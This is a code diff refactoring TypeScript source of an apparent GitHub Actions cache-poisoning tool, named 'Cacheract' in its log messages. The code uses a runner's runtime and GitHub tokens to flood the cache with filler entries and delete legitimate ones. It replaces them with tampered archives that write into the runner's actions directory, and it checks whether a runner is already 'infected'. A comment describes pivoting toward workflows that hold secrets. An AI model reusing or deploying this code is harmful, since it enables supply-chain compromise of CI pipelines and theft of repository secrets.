@@ -1,6 +1,6 @@
 import * as fs from 'fs';
 import * as crypto from 'crypto';
-import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry, sleep } from './utils';
+import { getToken, listCacheEntries, clearEntry, checkRunnerEnvironment, retrieveEntry, listActions, isDefaultBranch, updateArchive, generateRandomString, prepareFileEntry, createArchive, isInfected, checkCacheEntry, sleep, ensureDirExists, cleanupFile, setTokens, exitIfMissingTokens } from './utils';
 import axios from 'axios';
 import { CHECKOUT_YML } from './static';
 import { FILL_CACHE, SLEEP_TIMER, DISCORD_WEBHOOK, REPLACEMENTS, EXPLICIT_ENTRIES, SKIP_DOWNLOAD } from './config';
@@ -23,49 +23,27 @@ var cacheHttpClient = require('@actions/cache/lib/internal/cacheHttpClient');
  */
 async function setEntry(archive: string, key: string, version: string, runtimeToken: string): Promise<boolean> {
     try {
-        // Validate inputs
         if (!runtimeToken) {
             console.error('Runtime token is missing');
             return false;
         }
-
-        // Get file size of the archive path
         if (!fs.existsSync(archive)) {
             console.error(`Archive file does not exist at path: ${archive}`);
             return false;
         }
-
         const stats = fs.statSync(archive);
         const archiveFileSize = stats.size;
-
-        const request: CreateCacheEntryRequest = {
-            key,
-            version
-        }
-
+        const request: CreateCacheEntryRequest = { key, version };
         process.env['ACTIONS_RESULTS_URL'] = 'https://results-receiver.actions.githubusercontent.com';
         process.env['ACTIONS_RUNTIME_TOKEN'] = runtimeToken;
-
         const twirpClient = cacheTwirpClient.internalCacheTwirpClient();
-
         const response = await twirpClient.CreateCacheEntry(request);
-
-        const options: UploadOptions = {
-            useAzureSdk: true
-        }
-
+        const options: UploadOptions = { useAzureSdk: true };
         if (response.ok) {
             await cacheHttpClient.saveCache(-1, archive, response.signedUploadUrl, options);
             console.log('Cache entry created successfully:', response.data);
-
-            const finalizeRequest: FinalizeCacheEntryUploadRequest = {
-                key,
-                version,
-                sizeBytes: `${archiveFileSize}`
-            }
-
+            const finalizeRequest: FinalizeCacheEntryUploadRequest = { key, version, sizeBytes: `${archiveFileSize}` };
             const finalizeResponse: FinalizeCacheEntryUploadResponse = await twirpClient.FinalizeCacheEntryUpload(finalizeRequest);
-
             if (finalizeResponse.ok) {
                 console.log('Cache entry finalized successfully!');
                 return true;
@@ -77,7 +55,7 @@ async function setEntry(archive: string, key: string, version: string, runtimeTo
             console.log('Error saving cache entry:', response.status, response.statusText);
             return false;
         }
-      } catch (error) {
+    } catch (error) {
         console.error('Error setting cache entry:', error);
         return false;
     }
@@ -90,17 +68,11 @@ async function setEntry(archive: string, key: string, version: string, runtimeTo
  */
 export async function updateEntry(archive_path: string): Promise<boolean> {
     const currentFilePath = path.resolve(__dirname, __filename);
-
-    // Generate a random directory name
     const randomDirName = generateRandomString(12);
     const sourceDir = path.join('/tmp', `${randomDirName}`);
     const cacheFile = archive_path;
     const leadingPath = '/home/runner/work/_actions';
-
-    // Ensure the source directory exists
-    if (!fs.existsSync(sourceDir)) {
-        fs.mkdirSync(sourceDir, { recursive: true });
-    }
+    ensureDirExists(sourceDir);
 
     const archiveDetails: { stagingDir: string; leadingPath: string; }[] = []
 
@@ -161,11 +133,7 @@ async function createEntry(size: number): Promise<string> {
     const randomDirName = generateRandomString(12);
     const sourceDir = path.join('/tmp', `${randomDirName}`);
     const archivePath = path.join('/tmp', `${randomDirName}.tar.gz`);
-
-    // Ensure the source directory exists
-    if (!fs.existsSync(sourceDir)) {
-        fs.mkdirSync(sourceDir, { recursive: true });
-    }
+    ensureDirExists(sourceDir);
 
     // Create random file of number in size in sourcedir
     // Create random file with specified size
@@ -196,13 +164,7 @@ async function createEntry(size: number): Promise<string> {
     await createArchive(archivePath, sourceDir)
 
     // Only clean up the random file after the archive is created and presumably uploaded
-    try {
-        if (fs.existsSync(filePath)) {
-            fs.unlinkSync(filePath);
-        }
-    } catch (cleanupError) {
-        console.error('Error cleaning up temp random file:', cleanupError);
-    }
+    cleanupFile(filePath, 'temp random file');
 
     return archivePath;
 }
@@ -213,25 +175,18 @@ async function createAndSetEntry(
     version: string, 
     accessToken: string
 ) {
-    const path = await createEntry(size);
-    if (path) {
-        const status = await updateEntry(path);
-        if (status) {
-            await setEntry(path, key, version, accessToken);
-            // Clear the archive after upload
-            try {
-                if (fs.existsSync(path)) {
-                    fs.unlinkSync(path);
-                }
-            } catch (cleanupError) {
-                console.error('Error cleaning up archive after upload:', cleanupError);
-            }
-        } else {
-            console.error("Failed to modify archive!");
-        }
-    } else {
+    const archivePath = await createEntry(size);
+    if (!archivePath) {
         console.error("Failed to create entry for key.");
+        return;
     }
+    const status = await updateEntry(archivePath);
+    if (!status) {
+        console.error("Failed to modify archive!");
+        return;
+    }
+    await setEntry(archivePath, key, version, accessToken);
+    cleanupFile(archivePath, 'archive after upload');
 }
 
 async function main() {
@@ -269,20 +224,14 @@ async function main() {
         await sleep(SLEEP_TIMER * 1000);
     }
 
-    if (githubToken && accessToken) {
-        process.env['ACCESS_TOKEN'] = accessToken;
-        process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;
-
-    } else {
-        console.log('Missing required tokens, exiting.');
-        process.exit(0);
-    }
+    exitIfMissingTokens(githubToken, accessToken);
+    setTokens(accessToken!);
 
     // Fill the cache with some data - if specified
     if (!isInfected() && FILL_CACHE > 0) {
         for (let i = 0; i < FILL_CACHE; i++) {
             const counter = i.toString().padStart(2, '0');
-            await createAndSetEntry(1000000000, `setup-python-Linux-24.04.1-Ubuntu-python-${counter}`, "58627df9f4feac69570413c79e73cb53e7095372eaab31064b36520a602db61b", accessToken);
+            await createAndSetEntry(1000000000, `setup-python-Linux-24.04.1-Ubuntu-python-${counter}`, "58627df9f4feac69570413c79e73cb53e7095372eaab31064b36520a602db61b", accessToken!);
         }
     }
 
@@ -327,72 +276,56 @@ async function main() {
                 for (const entry of entries) {
                     const { key, version, ref, size } = entry;
                     const currBranch = process.env['GITHUB_REF'];
-                    
 
-                    if (isInfected() && currBranch === ref) {
-                        console.log(`Not attempting to clear entry as it already contains Cacheract.`);
-                        continue;
-                    }
-                    
-                    if (key.includes("setup-python-Linux-24.04.1")) {
-                        console.log("Skipping cacheract entry to avoid re-poisoning self.");
+                    // Skip if infected or self-poisoning
+                    if ((isInfected() && currBranch === ref) || key.includes("setup-python-Linux-24.04.1")) {
+                        console.log(`Skipping entry: ${key}`);
                         continue;
                     }
 
+                    // Handle previous clearEntry failure
                     if (clearEntryFailed) {
+                        const newKey = currBranch === ref ? key + '1' : key;
                         if (currBranch === ref) {
-                            console.log(`Skipping setting entry for key ${key} due to previous clearEntry failure`);
-                            // Instead, create a new cache entry with key + '1'
-                            const newKey = key + '1';
-                            console.log(`Creating new cache entry with key: ${newKey}`);
-                            await createAndSetEntry(size, newKey, version, accessToken);
-                            continue;
+                            console.log(`Skipping setting entry for key ${key} due to previous clearEntry failure. Creating new cache entry with key: ${newKey}`);
                         } else {
                             console.log("Attempting to update entry in main that is currently only in a feature branch or a custom entry.");
-                            await createAndSetEntry(size, key, version, accessToken);
-                            continue;
                         }
+                        await createAndSetEntry(size, newKey, version, accessToken);
+                        continue;
                     }
 
-                    let path = '';
-                    if (currBranch !== ref || SKIP_DOWNLOAD) {
-                        console.log(`Creating entry with filler data to avoid cache refresh.`);
-                        // Entry is not in the default branch, create a new entry
-                        path = await createEntry(size);
-                        // Since we can no longer set arbitrary string version, we use
-                        // cacheract's default stuffing key so we don't keep re-deleting poisoning it.
-                    } else  {
-                        // Entry is in default branch and we are adding to self.
-                        path = await retrieveEntry(key, version, accessToken);
-                        if (!path) {
-                            console.log(`Failed to retrieve cache entry ${key}!`);
-                            continue;
-                        }
+                    // Determine path: create or retrieve
+                    const needFiller = currBranch !== ref || SKIP_DOWNLOAD;
+                    const path = needFiller
+                        ? (console.log(`Creating entry with filler data to avoid cache refresh.`), await createEntry(size))
+                        : await retrieveEntry(key, version, accessToken);
+                    if (!path) {
+                        if (!needFiller) console.log(`Failed to retrieve cache entry ${key}!`);
+                        continue;
                     }
 
-                    // Update the entry, whether we made one or retrieved it.
+                    // Update the entry
                     const status = await updateEntry(path);
-                    if (status) {
-                        // Attempt to clear the entry from the feature branch
-                        // this will help us jump (such as to a tag that uses a secret, etc).
-                        const cleared = await clearEntry(key, version, githubToken);
-                        if (!cleared) {
-                            // Likely means we do not have actions: write
-                            console.log(`Failed to clear cache entry ${key}!`);
-                            clearEntryFailed = true;
-                        }
-                        // If we cleared the entry or if the entry was on feature branch then we set it.
-                        if (cleared || currBranch !== ref) {
-                            console.log(`Setting entry for key ${key}`);
-                            await setEntry(path, key, version, accessToken);
-                        } else {
-                            const newKey = key + '1';
-                            console.log(`Setting new cache entry with key: ${newKey}`);
-                            await setEntry(path, newKey, version, accessToken);
-                        }
-                    } else {
+                    if (!status) {
                         console.log("Failed to modify archive!");
+                        continue;
                     }
+
+                    // Attempt to clear the entry from the feature branch
+                    const cleared = await clearEntry(key, version, githubToken);
+                    if (!cleared) {
+                        console.log(`Failed to clear cache entry ${key}!`);
+                        clearEntryFailed = true;
+                    }
+
+                    // Set the entry (with new key if needed)
+                    const setKey = (cleared || currBranch !== ref) ? key : key + '1';
+                    const setMsg = (cleared || currBranch !== ref)
+                        ? `Setting entry for key ${setKey}`
+                        : `Setting new cache entry with key: ${setKey}`;
+                    console.log(setMsg);
+                    await setEntry(path, setKey, version, accessToken);
                 }
             }
         } catch (error) {
